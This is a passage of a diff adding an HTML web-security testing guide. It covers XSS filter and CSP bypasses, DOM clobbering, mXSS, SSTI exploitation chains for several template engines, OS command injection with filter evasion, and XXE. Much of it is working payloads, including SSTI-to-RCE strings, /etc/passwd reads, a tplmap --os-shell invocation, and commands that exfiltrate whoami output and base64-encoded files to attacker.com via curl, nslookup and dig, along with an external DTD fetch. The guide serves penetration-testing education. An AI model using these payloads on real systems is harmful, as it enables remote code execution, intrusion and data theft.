+                        <td>$regex enumeration, $where JS execution</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Blind Detection</td>
+                        <td>AND 1=1 / AND 1=2</td>
+                        <td>$regex true/false, $where sleep()</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Schema Discovery</td>
+                        <td>information_schema</td>
+                        <td>$exists, $type operators on field names</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Prevention</td>
+                        <td>Parameterized queries / prepared statements</td>
+                        <td>Input type validation, mongo-sanitize, disable $where</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div>
+                    <div class="callout-title">Testing for NoSQL Injection</div>
+                    <div class="callout-text">
+                        Always test both JSON content types and URL-encoded parameters. Many applications
+                        accept JSON on API endpoints but URL-encoded data on traditional form endpoints.
+                        The same backend code may be vulnerable through one content type but not the other
+                        depending on how the framework parses input.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 03: XSS Filter Bypass & WAF Evasion                  -->
+    <!-- ============================================================ -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128295;</span>
+            XSS Filter Bypass &amp; WAF Evasion
+        </h2>
+        <div class="section-body">
+            <p>
+                Cross-site scripting in modern applications is rarely as simple as injecting
+                <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Applications deploy input
+                filters, output encoding, Content Security Policy headers, and Web Application
+                Firewalls that block known XSS patterns. Successful exploitation requires
+                understanding exactly what the filter blocks and finding a representation of
+                your payload that passes through the filter but is still interpreted as executable
+                code by the browser.
+            </p>
+
+            <h3>Common Filter Patterns and Bypasses</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Filter Rule</th>
+                        <th>What It Blocks</th>
+                        <th>Bypass Technique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Strip &lt;script&gt;</td>
+                        <td>Removes script tags</td>
+                        <td><code>&lt;scr&lt;script&gt;ipt&gt;</code>, <code>&lt;SCRIPT&gt;</code>, <code>&lt;img onerror=...&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Block alert()</td>
+                        <td>Filters the word "alert"</td>
+                        <td><code>confirm()</code>, <code>prompt()</code>, <code>window['al'+'ert'](1)</code></td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Block parentheses</td>
+                        <td>Removes ( and )</td>
+                        <td><code>&lt;img onerror=alert`1`&gt;</code> (template literals)</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Block on* attributes</td>
+                        <td>Strips event handlers</td>
+                        <td><code>&lt;svg/onload=...&gt;</code>, <code>&lt;body onpageshow=...&gt;</code>, <code>&lt;details open ontoggle=...&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Block quotes</td>
+                        <td>Removes single/double quotes</td>
+                        <td><code>&lt;img onerror=alert(1)&gt;</code> (no quotes needed), backtick notation</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Keyword blacklist</td>
+                        <td>Blocks "javascript:", "onerror", "onload"</td>
+                        <td>Case mixing, null bytes, tab/newline insertion: <code>java&#9;script:</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Encoding Techniques</h3>
+
+            <div class="code-block"><span class="comment"># HTML entity encoding</span>
+&lt;img src=x onerror=<span class="str">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)</span>&gt;
+<span class="comment"># Decodes to: alert(1) &mdash; browser decodes HTML entities in attribute values</span>
+
+<span class="comment"># Hex HTML entities</span>
+&lt;img src=x onerror=<span class="str">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;
+
+<span class="comment"># URL encoding (useful in href/src attributes)</span>
+&lt;a href=<span class="str">"javascript:%61%6c%65%72%74(1)"</span>&gt;click&lt;/a&gt;
+
+<span class="comment"># Double URL encoding (when server decodes once, WAF sees encoded)</span>
+<span class="str">%253Cscript%253Ealert(1)%253C/script%253E</span>
+<span class="comment"># Server decodes to: %3Cscript%3Ealert(1)%3C/script%3E</span>
+<span class="comment"># Application decodes to: &lt;script&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="comment"># Unicode escapes in JavaScript context</span>
+&lt;script&gt;<span class="str">\u0061\u006c\u0065\u0072\u0074</span>(1)&lt;/script&gt;
+
+<span class="comment"># Mixed encoding</span>
+&lt;svg/onload=<span class="str">&amp;#x61;lert&amp;lpar;1&amp;rpar;</span>&gt;</div>
+
+            <h3>Event Handler Alternatives</h3>
+            <p>
+                When common event handlers like <code>onerror</code> and <code>onload</code> are
+                filtered, dozens of alternative handlers exist across different HTML elements.
+            </p>
+
+            <div class="code-block"><span class="comment"># Less commonly filtered event handlers</span>
+&lt;details open <span class="kw">ontoggle</span>=alert(1)&gt;
+&lt;marquee <span class="kw">onstart</span>=alert(1)&gt;
+&lt;video src=x <span class="kw">onerror</span>=alert(1)&gt;
+&lt;audio src=x <span class="kw">onerror</span>=alert(1)&gt;
+&lt;input <span class="kw">onfocus</span>=alert(1) autofocus&gt;
+&lt;select <span class="kw">onfocus</span>=alert(1) autofocus&gt;
+&lt;textarea <span class="kw">onfocus</span>=alert(1) autofocus&gt;
+&lt;body <span class="kw">onresize</span>=alert(1)&gt;
+&lt;body <span class="kw">onpageshow</span>=alert(1)&gt;
+&lt;object data=<span class="str">"javascript:alert(1)"</span>&gt;
+&lt;embed src=<span class="str">"javascript:alert(1)"</span>&gt;
+&lt;svg&gt;&lt;animate <span class="kw">onbegin</span>=alert(1) attributeName=x dur=1s&gt;
+&lt;math&gt;&lt;maction actiontype=statusline <span class="kw">xlink:href</span>=<span class="str">"javascript:alert(1)"</span>&gt;click&lt;/maction&gt;&lt;/math&gt;</div>
+
+            <h3>CSP Bypass Techniques</h3>
+            <p>
+                Content Security Policy (CSP) is the strongest browser-side defense against XSS.
+                However, misconfigured CSPs are common and can be bypassed in several ways.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-title">Unsafe-inline</div>
+                    <div class="concept-card-body">
+                        If the CSP includes <code>script-src 'unsafe-inline'</code>, inline scripts
+                        and event handlers execute freely. This directive effectively nullifies CSP
+                        for XSS protection. Common in legacy applications that added CSP without
+                        refactoring their JavaScript.
+                    </div>
+                    <div class="concept-tag">Misconfiguration</div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Whitelisted CDNs</div>
+                    <div class="concept-card-body">
+                        If the CSP whitelists a CDN that hosts user-uploadable content or JSONP
+                        endpoints, you can load your payload from the whitelisted domain.
+                        <code>cdnjs.cloudflare.com</code> hosts Angular which enables template
+                        injection bypasses.
+                    </div>
+                    <div class="concept-tag">CDN Abuse</div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Base-URI Missing</div>
+                    <div class="concept-card-body">
+                        If the CSP does not include a <code>base-uri</code> directive, injecting
+                        <code>&lt;base href="https://attacker.com/"&gt;</code> redirects all relative
+                        script imports to load from your controlled domain.
+                    </div>
+                    <div class="concept-tag">Base Hijacking</div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">JSONP Endpoints</div>
+                    <div class="concept-card-body">
+                        JSONP endpoints on whitelisted domains accept a callback parameter that wraps
+                        the response in a function call. If you control the callback name, you can
+                        execute arbitrary JavaScript through a script src pointing to the JSONP URL.
+                    </div>
+                    <div class="concept-tag">JSONP Gadget</div>
+                </div>
+            </div>
+
+            <div class="code-block"><span class="comment"># CSP bypass via Angular on whitelisted CDN</span>
+<span class="comment"># CSP: script-src cdnjs.cloudflare.com</span>
+&lt;script src=<span class="str">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"</span>&gt;&lt;/script&gt;
+&lt;div ng-app ng-csp&gt;{{constructor.constructor('alert(1)')()}}&lt;/div&gt;
+
+<span class="comment"># CSP bypass via JSONP on whitelisted domain</span>
+<span class="comment"># CSP: script-src accounts.google.com</span>
+&lt;script src=<span class="str">"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"</span>&gt;&lt;/script&gt;
+
+<span class="comment"># CSP bypass via base tag (when base-uri is not restricted)</span>
+&lt;base href=<span class="str">"https://attacker.com/"</span>&gt;
+<span class="comment"># All relative script paths now resolve to attacker.com</span></div>
+
+            <h3>DOM Clobbering</h3>
+            <p>
+                DOM clobbering exploits the browser behavior where named HTML elements (elements
+                with <code>id</code> or <code>name</code> attributes) are accessible as properties
+                of the <code>window</code> and <code>document</code> objects. By injecting HTML
+                elements with specific names, you can overwrite variables that the application's
+                JavaScript reads, altering its control flow.
+            </p>
+
+            <div class="code-block"><span class="comment"># Application code checks: if (window.config) { ... }</span>
+<span class="comment"># Clobber window.config with an anchor tag</span>
+&lt;a id=<span class="str">"config"</span> href=<span class="str">"javascript:alert(1)"</span>&gt;&lt;/a&gt;
+
+<span class="comment"># Clobber nested property: window.config.url</span>
+&lt;form id=<span class="str">"config"</span>&gt;&lt;input id=<span class="str">"url"</span> value=<span class="str">"javascript:alert(1)"</span>&gt;&lt;/form&gt;
+
+<span class="comment"># Clobber toString via anchor href</span>
+&lt;a id=<span class="str">"config"</span> href=<span class="str">"cid:alert(1)"</span>&gt;&lt;/a&gt;
+<span class="comment"># window.config.toString() returns "cid:alert(1)"</span></div>
+
+            <h3>Mutation XSS (mXSS)</h3>
+            <p>
+                Mutation XSS occurs when a sanitizer processes HTML, producing output that it
+                considers safe, but the browser re-parses and mutates the DOM structure in a way
+                that introduces executable code. The sanitizer and the browser disagree about the
+                meaning of the same HTML string.
+            </p>
+
+            <div class="code-block"><span class="comment"># mXSS via namespace confusion (SVG/math)</span>
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;<span class="str">&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;--&gt;</span>&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/mtext&gt;&lt;/math&gt;
+
+<span class="comment"># mXSS via p tag auto-closing behavior</span>
+&lt;p&gt;&lt;style&gt;&lt;p title="&lt;/style&gt;<span class="str">&lt;img src=x onerror=alert(1)&gt;</span>"&gt;</div>
+
+            <h3>Polyglot Payloads</h3>
+            <p>
+                A polyglot XSS payload is designed to execute in multiple injection contexts
+                simultaneously &mdash; HTML attribute, JavaScript string, URL parameter, and
+                more. Useful when you are unsure which context your input lands in.
+            </p>
+
+            <div class="code-block"><span class="comment"># Multi-context polyglot</span>
+<span class="str">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Responsible XSS Testing</div>
+                    <div class="callout-text">
+                        Never use <code>alert()</code> with sensitive data or on production systems in ways
+                        that could disrupt users. Use <code>alert(document.domain)</code> to prove execution
+                        context without accessing user data. For stored XSS, use a payload that only fires
+                        for your session. Document the impact chain clearly in your report.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 04: Server-Side Template Injection (SSTI)            -->
+    <!-- ============================================================ -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128196;</span>
+            Server-Side Template Injection (SSTI)
+        </h2>
+        <div class="section-body">
+            <p>
+                Server-Side Template Injection occurs when user input is embedded directly into a
+                template string that is processed by a server-side template engine. Unlike XSS,
+                which executes in the browser, SSTI executes on the server, meaning successful
+                exploitation typically leads to Remote Code Execution (RCE), file system access,
+                and full server compromise. Template engines are designed to be expressive &mdash;
+                they intentionally provide access to programming constructs &mdash; which makes
+                them exceptionally dangerous when user input reaches them.
+            </p>
+
+            <h3>Detection Methodology</h3>
+            <p>
+                The detection approach uses mathematical expressions that template engines evaluate
+                but that have no meaning in plain HTML. If the server returns the computed result
+                instead of the literal string, the input is being processed by a template engine.
+            </p>
+
+            <div class="code-block"><span class="comment"># Universal detection probes</span>
+<span class="str">{{7*7}}</span>         <span class="comment"># Returns "49" if Jinja2, Twig, or similar</span>
+<span class="str">${7*7}</span>          <span class="comment"># Returns "49" if Freemarker, Mako, or EL</span>
+<span class="str">#{7*7}</span>          <span class="comment"># Returns "49" if Ruby ERB or Thymeleaf</span>
+<span class="str"><%= 7*7 %></span>     <span class="comment"># Returns "49" if ERB or EJS</span>
+<span class="str">{{7*'7'}}</span>       <span class="comment"># Returns "7777777" in Jinja2, "49" in Twig &mdash; engine fingerprinting</span>
+
+<span class="comment"># Fingerprinting decision tree</span>
+<span class="comment"># {{7*'7'}} = 7777777  &rarr; Jinja2 (Python)</span>
+<span class="comment"># {{7*'7'}} = 49       &rarr; Twig (PHP)</span>
+<span class="comment"># ${7*7}   = 49        &rarr; Freemarker (Java) or Mako (Python)</span>
+<span class="comment"># #{7*7}   = 49        &rarr; Thymeleaf (Java) or ERB (Ruby)</span></div>
+
+            <h3>Jinja2 Exploitation Chain (Python)</h3>
+            <p>
+                Jinja2 is the most commonly encountered template engine in bug bounty targets because
+                of Flask's prevalence. The exploitation chain starts with accessing the Python object
+                hierarchy through template expressions, climbing from string objects to the base
+                <code>object</code> class, enumerating subclasses, and finding one that provides
+                access to <code>os</code> or <code>subprocess</code>.
+            </p>
+
+            <div class="code-block"><span class="comment"># Step 1: Access config object (often contains SECRET_KEY)</span>
+<span class="str">{{config}}</span>
+<span class="str">{{config.items()}}</span>
+
+<span class="comment"># Step 2: Access the class hierarchy</span>
+<span class="str">{{''.__class__}}</span>                              <span class="comment"># &lt;class 'str'&gt;</span>
+<span class="str">{{''.__class__.__mro__}}</span>                      <span class="comment"># (&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span>
+<span class="str">{{''.__class__.__mro__[1]}}</span>                    <span class="comment"># &lt;class 'object'&gt;</span>
+<span class="str">{{''.__class__.__mro__[1].__subclasses__()}}</span>   <span class="comment"># List of all loaded classes</span>
+
+<span class="comment"># Step 3: Find a useful subclass (index varies by environment)</span>
+<span class="comment"># Look for: subprocess.Popen, os._wrap_close, warnings.catch_warnings</span>
+<span class="str">{{''.__class__.__mro__[1].__subclasses__()[INDEX]}}</span>
+
+<span class="comment"># Step 4: RCE via os.popen (through _wrap_close)</span>
+<span class="str">{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}</span>
+
+<span class="comment"># Step 5: RCE via subprocess.Popen</span>
+<span class="str">{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}</span>
+
+<span class="comment"># Alternative: use request object</span>
+<span class="str">{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</span>
+
+<span class="comment"># Alternative: bypass filters using |attr()</span>
+<span class="str">{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(INDEX)}}</span></div>
+
+            <h3>Twig Exploitation (PHP)</h3>
+
+            <div class="code-block"><span class="comment"># Detection</span>
+<span class="str">{{7*7}}</span>     <span class="comment"># Returns 49</span>
+<span class="str">{{7*'7'}}</span>   <span class="comment"># Returns 49 (differs from Jinja2's 7777777)</span>
+
+<span class="comment"># Environment information</span>
+<span class="str">{{_self.env.display('id')}}</span>
+
+<span class="comment"># Twig 1.x RCE</span>
+<span class="str">{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}</span>
+
+<span class="comment"># Twig 3.x RCE via filter</span>
+<span class="str">{{['id']|filter('system')}}</span>
+<span class="str">{{['cat /etc/passwd']|filter('system')}}</span>
+
+<span class="comment"># Twig: map function for RCE</span>
+<span class="str">{{['id']|map('passthru')}}</span></div>
+
+            <h3>Freemarker Exploitation (Java)</h3>
+
+            <div class="code-block"><span class="comment"># Detection</span>
+<span class="str">${7*7}</span>           <span class="comment"># Returns 49</span>
+<span class="str">${"freemarker"}</span>  <span class="comment"># Returns "freemarker"</span>
+
+<span class="comment"># Read file</span>
+<span class="str">${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}</span>
+
+<span class="comment"># RCE via Execute</span>
+<span class="str">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</span>
+
+<span class="comment"># RCE via ObjectConstructor</span>
+<span class="str">&lt;#assign oc="freemarker.template.utility.ObjectConstructor"?new()&gt;${oc("java.lang.Runtime").getRuntime().exec("id")}</span></div>
+
+            <h3>Additional Template Engines</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#9881;</span>
+                        <div>
+                            <div class="detail-header-title">Velocity (Java)</div>
+                            <div class="detail-header-subtitle">Apache Velocity template payloads</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <div class="code-block"><span class="comment"># Detection</span>
+<span class="str">#set($x = 7*7)${x}</span>   <span class="comment"># Returns 49</span>
+
+<span class="comment"># RCE via Runtime</span>
+<span class="str">#set($rt = $x.class.forName('java.lang.Runtime'))
+#set($chr = $rt.getRuntime())
+$chr.exec('id')</span>
+
+<span class="comment"># Read file contents</span>
+<span class="str">#set($file = $x.class.forName('java.io.File'))
+#set($reader = $x.class.forName('java.util.Scanner'))
+#set($f = $file.getConstructor($x.class).newInstance('/etc/passwd'))
+#set($s = $reader.getConstructor($f.class).newInstance($f))
+$s.useDelimiter('\A').next()</span></div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#9881;</span>
+                        <div>
+                            <div class="detail-header-title">Thymeleaf (Java/Spring)</div>
+                            <div class="detail-header-subtitle">Spring expression language injection</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <div class="code-block"><span class="comment"># Detection via URL path (Spring + Thymeleaf)</span>
+<span class="cmd">GET</span> /path/<span class="str">__${7*7}__</span>/info
+
+<span class="comment"># RCE via SpEL (Spring Expression Language)</span>
+<span class="str">__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x</span>
+
+<span class="comment"># RCE via ProcessBuilder</span>
+<span class="str">__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__::.x</span>
+
+<span class="comment"># URL-encoded version</span>
+<span class="cmd">GET</span> /path/<span class="str">__%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D__</span>::.x</div>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div>
+                    <div class="callout-title">SSTI to RCE Progression</div>
+                    <div class="callout-text">
+                        The exploitation chain always follows the same pattern: detect template evaluation,
+                        fingerprint the engine, access the language runtime through the template's object
+                        model, and execute operating system commands. The specific objects and methods
+                        differ between engines, but the conceptual path is identical. Use tplmap to
+                        automate detection and exploitation across multiple template engines simultaneously.
+                    </div>
+                </div>
+            </div>
+
+            <div class="code-block"><span class="comment"># tplmap: automated SSTI detection and exploitation</span>
+<span class="cmd">tplmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/page?name=test"</span>
+<span class="cmd">tplmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/page?name=test"</span> <span class="flag">--os-shell</span>
+<span class="cmd">tplmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/page?name=test"</span> <span class="flag">--os-cmd</span> <span class="str">"id"</span></div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 05: Command Injection                                -->
+    <!-- ============================================================ -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9000;</span>
+            Command Injection
+        </h2>
+        <div class="section-body">
+            <p>
+                OS command injection occurs when an application passes user-controlled data to a
+                system shell. The application may intend to execute a single command with the user
+                input as an argument, but shell metacharacters allow the attacker to append, chain,
+                or substitute additional commands. The impact is always critical &mdash; direct
+                operating system access at the privilege level of the web application process.
+            </p>
+
+            <h3>Shell Metacharacter Chaining</h3>
+            <p>
+                Different metacharacters have different semantics in how they chain commands together.
+                Understanding these differences is essential for crafting payloads that work in
+                different injection contexts.
+            </p>
+
+            <div class="code-block"><span class="comment"># Semicolon: execute sequentially regardless of previous result</span>
+<span class="str">127.0.0.1; id</span>
+
+<span class="comment"># Pipe: pipe stdout of first command to second</span>
+<span class="str">127.0.0.1 | id</span>
+
+<span class="comment"># AND: execute second only if first succeeds (exit code 0)</span>
+<span class="str">127.0.0.1 && id</span>
+
+<span class="comment"># OR: execute second only if first fails (non-zero exit code)</span>
+<span class="str">|| id</span>
+
+<span class="comment"># Backtick substitution: inner command executes first, output replaces backticks</span>
+<span class="str">127.0.0.1 `id`</span>
+
+<span class="comment"># $() substitution: same as backticks, modern syntax</span>
+<span class="str">127.0.0.1 $(id)</span>
+
+<span class="comment"># Newline: many parsers treat newline as command separator</span>
+<span class="str">127.0.0.1%0aid</span>
+
+<span class="comment"># Typical vulnerable code (Python)</span>
+os.system(<span class="str">"ping -c 1 "</span> + user_input)
+<span class="comment"># Input: 127.0.0.1; cat /etc/passwd</span>
+<span class="comment"># Executes: ping -c 1 127.0.0.1; cat /etc/passwd</span></div>
+
+            <h3>Blind Command Injection</h3>
+            <p>
+                When the application does not return command output in the response, you must
+                use out-of-band or timing techniques to confirm execution and extract data.
+            </p>
+
+            <div class="code-block"><span class="comment"># Time-based detection</span>
+<span class="str">127.0.0.1; sleep 10</span>
+<span class="str">127.0.0.1 && sleep 10</span>
+<span class="str">127.0.0.1 | sleep 10</span>
+
+<span class="comment"># DNS exfiltration (confirm execution and extract data)</span>
+<span class="str">127.0.0.1; nslookup $(whoami).attacker.com</span>
+<span class="str">127.0.0.1; dig $(hostname).attacker.com</span>
+<span class="str">127.0.0.1; curl http://attacker.com/$(whoami)</span>
+
+<span class="comment"># HTTP exfiltration of file contents</span>
+<span class="str">127.0.0.1; curl http://attacker.com/?d=$(cat /etc/passwd | base64 | tr -d '\n')</span>
+
+<span class="comment"># Write output to accessible web directory</span>
+<span class="str">127.0.0.1; id > /var/www/html/output.txt</span>
+
+<span class="comment"># Burp Collaborator / interactsh detection</span>
+<span class="str">127.0.0.1; nslookup burpcollaborator-id.oastify.com</span>
+<span class="str">127.0.0.1; curl https://interactsh-id.interact.sh</span></div>
+
+            <h3>Filter Bypass Techniques</h3>
+            <p>
+                Applications often implement blacklists that block spaces, common command names,
+                or special characters. Each filter has known bypass methods.
+            </p>
+
+            <div class="code-block"><span class="comment"># Space bypass with $IFS (Internal Field Separator)</span>
+<span class="str">cat${IFS}/etc/passwd</span>
+<span class="str">cat$IFS$9/etc/passwd</span>
+
+<span class="comment"># Space bypass with tab (%09)</span>
+<span class="str">cat%09/etc/passwd</span>
+
+<span class="comment"># Space bypass with brace expansion</span>
+<span class="str">{cat,/etc/passwd}</span>
+
+<span class="comment"># Command name bypass with variable substitution</span>
+<span class="str">a=c;b=at;$a$b /etc/passwd</span>
+<span class="str">$(printf '\x63\x61\x74') /etc/passwd</span>
+
+<span class="comment"># Command name bypass with wildcards</span>
+<span class="str">/bin/c?t /etc/passwd</span>
+<span class="str">/bin/ca* /etc/passwd</span>
+<span class="str">/???/??t /etc/passwd</span>
+
+<span class="comment"># Slash bypass</span>
+<span class="str">cat ${HOME:0:1}etc${HOME:0:1}passwd</span>
+
+<span class="comment"># Quote insertion (ignored by shell, breaks regex filters)</span>
+<span class="str">c''at /etc/passwd</span>
+<span class="str">c""at /etc/passwd</span>
+
+<span class="comment"># Backslash insertion</span>
+<span class="str">c\at /etc/passwd</span>
+
+<span class="comment"># Newline bypass (%0a)</span>
+<span class="str">%0acat%20/etc/passwd</span>
+
+<span class="comment"># Encoding combined: tab + variable + wildcard</span>
+<span class="str">a=ca;${a}t%09/etc/pass*</span></div>
+
+            <h3>Injection Through Different Contexts</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#9658; Common Injection Points</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8227;</span> Filename parameters (image processing, PDF generation)</li>
+                        <li><span class="li-marker">&#8227;</span> Network tool wrappers (ping, traceroute, nslookup, whois)</li>
+                        <li><span class="li-marker">&#8227;</span> File path arguments (backup, archive, log viewing)</li>
+                        <li><span class="li-marker">&#8227;</span> Git/SVN operations (repository URL, branch name)</li>
+                        <li><span class="li-marker">&#8227;</span> Email sending (recipient, subject, body via sendmail)</li>
+                        <li><span class="li-marker">&#8227;</span> User-Agent / Referer headers (logged and processed)</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#9658; Argument Injection</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8227;</span> When input is used as a flag argument, not a new command</li>
+                        <li><span class="li-marker">&#8227;</span> <code>curl</code>: <code>-o /tmp/shell.php</code> writes to file</li>
+                        <li><span class="li-marker">&#8227;</span> <code>tar</code>: <code>--checkpoint-action=exec=id</code></li>
+                        <li><span class="li-marker">&#8227;</span> <code>find</code>: <code>-exec id \;</code></li>
+                        <li><span class="li-marker">&#8227;</span> <code>git</code>: <code>--upload-pack=id</code></li>
+                        <li><span class="li-marker">&#8227;</span> Use <code>--</code> to terminate flag parsing in the app</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Windows Command Injection</div>
+                    <div class="callout-text">
+                        Windows uses different metacharacters: <code>&amp;</code> (chain),
+                        <code>|</code> (pipe), <code>&amp;&amp;</code> / <code>||</code>
+                        (conditional), and <code>%0a</code> (newline). The <code>$IFS</code>
+                        technique does not work on Windows. Use <code>%COMSPEC%</code> or
+                        <code>cmd /c</code> for shell access. Test both <code>cmd.exe</code>
+                        and <code>powershell.exe</code> contexts.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 06: XML External Entity (XXE)                        -->
+    <!-- ============================================================ -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128195;</span>
+            XML External Entity (XXE)
+        </h2>
+        <div class="section-body">
+            <p>
+                XML External Entity injection exploits the XML parser's entity expansion feature.
+                When an application parses XML input without disabling external entity resolution,
+                an attacker can define entities that reference local files, internal network
+                resources, or external URLs. The parser resolves these entities during parsing,
+                and the result &mdash; file contents, SSRF responses, or error messages &mdash;
+                may be reflected in the application's output or exfiltrated out-of-band.
+            </p>
+
+            <h3>Classic XXE for File Read</h3>
+
+            <div class="code-block"><span class="comment">&lt;!-- Basic file read via external entity --&gt;</span>
+<span class="kw">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"file:///etc/passwd"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;
+  &lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;
+&lt;/root&gt;
+
+<span class="comment">&lt;!-- Read source code (use PHP wrapper to base64 encode) --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"php://filter/convert.base64-encode/resource=/var/www/html/config.php"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;&lt;/root&gt;
+
+<span class="comment">&lt;!-- Windows file read --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"file:///c:/windows/win.ini"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;&lt;/root&gt;
+
+<span class="comment">&lt;!-- Directory listing (Java parsers) --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"file:///var/www/html/"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;&lt;/root&gt;</div>
+
+            <h3>Blind XXE with OOB Exfiltration</h3>
+            <p>
+                When the application does not reflect entity values in the response, you use
+                parameter entities to force the parser to make an outbound request carrying file
+                contents. This requires hosting a malicious DTD on an attacker-controlled server.
+            </p>
+
+            <div class="code-block"><span class="comment">&lt;!-- Step 1: Payload sent to target --&gt;</span>
+<span class="kw">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> % dtd <span class="kw">SYSTEM</span> <span class="str">"http://attacker.com/evil.dtd"</span><span class="kw">&gt;</span>
+  <span class="kw">%dtd;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;test&lt;/data&gt;&lt;/root&gt;
+
+<span class="comment">&lt;!-- Step 2: evil.dtd hosted on attacker.com --&gt;</span>
